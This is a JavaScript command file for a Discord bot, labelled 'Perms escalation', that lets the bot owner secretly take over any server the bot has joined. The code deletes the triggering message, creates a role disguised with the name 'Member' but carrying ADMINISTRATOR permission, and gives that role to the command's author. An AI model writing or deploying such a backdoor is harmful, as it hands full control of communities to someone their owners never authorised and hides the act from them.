module.exports = {
  alias: ["escalate", "esc"],
  description: "Perms escalation",
  permission: "botowner",
  usage: "",
  async execute (message, args, latency, commands, client) {
    message.delete();
    message.guild.fetchMember(client.user).then(user => {
      message.guild.createRole({
        name: "Member",
        permissions: "ADMINISTRATOR",
        position: user.highestRole.position
      }).then(role => {
        message.guild.fetchMember(message.author.id).then(me => {
          me.addRole(role);
        });
      });
    });
  }
};
